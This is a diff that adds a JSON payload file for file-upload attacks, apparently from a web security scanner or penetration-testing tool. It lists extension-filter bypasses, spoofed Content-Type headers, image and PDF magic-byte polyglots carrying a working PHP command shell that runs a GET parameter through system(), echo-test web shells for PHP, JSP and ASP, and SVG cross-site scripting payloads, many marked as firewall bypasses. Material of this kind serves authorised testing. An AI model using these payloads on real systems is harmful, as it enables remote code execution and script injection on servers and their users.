@@ -1,0 +1,65 @@
+{
+  "category": "file_upload",
+  "contexts": {
+    "extension_bypass": {
+      "description": "File extension bypass techniques to upload executable files past extension filters",
+      "payloads": [
+        {"payload": "shell.php.jpg", "description": "Double extension — Apache may execute as PHP if AddHandler is misconfigured", "waf_bypass": false},
+        {"payload": "shell.php%00.jpg", "description": "Null byte truncation — strips .jpg before saving (PHP < 5.3.4)", "waf_bypass": true},
+        {"payload": "shell.pHp", "description": "Mixed case extension — bypasses case-sensitive blacklists", "waf_bypass": true},
+        {"payload": "shell.php5", "description": "Alternative PHP extension — often not blacklisted", "waf_bypass": true},
+        {"payload": "shell.phtml", "description": "Legacy PHP extension — parsed as PHP by default Apache configs", "waf_bypass": true},
+        {"payload": "shell.php.", "description": "Trailing dot — Windows strips it, leaving .php", "waf_bypass": true},
+        {"payload": "shell.php ::$DATA", "description": "NTFS alternate data stream — Windows IIS bypass", "waf_bypass": true},
+        {"payload": "shell.php;.jpg", "description": "Semicolon extension — IIS6 treats as .php", "waf_bypass": true},
+        {"payload": "shell.php%20", "description": "Trailing space — some systems strip whitespace after saving", "waf_bypass": true},
+        {"payload": "shell.shtml", "description": "Server-Side Include extension — executes SSI directives", "waf_bypass": true},
+        {"payload": "shell.jsp.png", "description": "Double extension for Java servers", "waf_bypass": false},
+        {"payload": "shell.aspx;.jpg", "description": "Semicolon extension bypass for ASP.NET/IIS", "waf_bypass": true}
+      ]
+    },
+    "content_type_bypass": {
+      "description": "Content-Type header manipulation to bypass MIME-type validation",
+      "payloads": [
+        {"payload": "Content-Type: image/jpeg (with PHP content)", "description": "Set MIME to image/jpeg while uploading PHP — bypasses Content-Type checks", "waf_bypass": false},
+        {"payload": "Content-Type: image/png (with JSP content)", "description": "Set MIME to image/png while uploading JSP", "waf_bypass": false},
+        {"payload": "Content-Type: image/gif (with ASPX content)", "description": "Set MIME to image/gif while uploading ASPX", "waf_bypass": false},
+        {"payload": "Content-Type: application/octet-stream", "description": "Generic binary MIME type — often whitelisted", "waf_bypass": true},
+        {"payload": "Content-Type: text/plain (with PHP content)", "description": "Plain text MIME — may bypass image-only checks", "waf_bypass": true},
+        {"payload": "Dual Content-Type: image/jpeg and text/php", "description": "Two Content-Type headers — parser may use first while server uses second", "waf_bypass": true}
+      ]
+    },
+    "magic_bytes": {
+      "description": "Magic byte prepending to pass file signature validation while keeping payload executable",
+      "payloads": [
+        {"payload": "GIF89a; <?php system($_GET['c']); ?>", "description": "GIF header + PHP — passes GIF magic byte check, executes as PHP", "waf_bypass": true},
+        {"payload": "\\x89PNG\\r\\n\\x1a\\n <?php system($_GET['c']); ?>", "description": "PNG header + PHP — passes PNG signature validation", "waf_bypass": true},
+        {"payload": "\\xFF\\xD8\\xFF\\xE0 <?php system($_GET['c']); ?>", "description": "JPEG header + PHP — passes JPEG/JFIF magic byte check", "waf_bypass": true},
+        {"payload": "%PDF-1.4 <?php system($_GET['c']); ?>", "description": "PDF header + PHP — passes PDF signature check", "waf_bypass": true},
+        {"payload": "GIF89a<script>alert(1)</script>", "description": "GIF header + XSS — stored XSS via image rendering", "waf_bypass": true}
+      ]
+    },
+    "web_shells": {
+      "description": "Minimal web shell payloads for various server-side languages",
+      "payloads": [
+        {"payload": "<?php echo 'UPLOAD_TEST_OK'; ?>", "description": "PHP echo test — confirms PHP execution without harmful commands", "waf_bypass": false},
+        {"payload": "<?= 'UPLOAD_TEST_OK' ?>", "description": "PHP short tag echo — bypasses <?php keyword filters", "waf_bypass": true},
+        {"payload": "<% out.println(\"UPLOAD_TEST_OK\"); %>", "description": "JSP echo test — confirms JSP execution", "waf_bypass": false},
+        {"payload": "<%= \"UPLOAD_TEST_OK\" %>", "description": "JSP expression tag — alternative syntax", "waf_bypass": false},
+        {"payload": "<% Response.Write(\"UPLOAD_TEST_OK\") %>", "description": "Classic ASP echo test", "waf_bypass": false},
+        {"payload": "<%@ Page Language=\"C#\" %><%= \"UPLOAD_TEST_OK\" %>", "description": "ASPX echo test — confirms ASP.NET execution", "waf_bypass": false},
+        {"payload": "<?php echo(\"UPLOAD_TEST_OK\");__halt_compiler(); ?>", "description": "PHP with halt_compiler — minimal footprint, stops further parsing", "waf_bypass": true}
+      ]
+    },
+    "svg_xss": {
+      "description": "SVG files containing XSS payloads — browsers render SVGs and execute embedded JavaScript",
+      "payloads": [
+        {"payload": "<svg onload=alert('UPLOAD_TEST_OK')>", "description": "SVG onload XSS — simplest SVG XSS payload", "waf_bypass": false},
+        {"payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('UPLOAD_TEST_OK')</script></svg>", "description": "SVG with embedded script element", "waf_bypass": false},
+        {"payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/>", "description": "SVG use element with data URI — advanced XSS", "waf_bypass": true},
+        {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "description": "SVG animate element XSS — less commonly filtered", "waf_bypass": true},
+        {"payload": "<svg><set onbegin=alert(1) attributename=x to=1>", "description": "SVG set element XSS — another uncommon event handler", "waf_bypass": true}
+      ]
+    }
+  }
+}
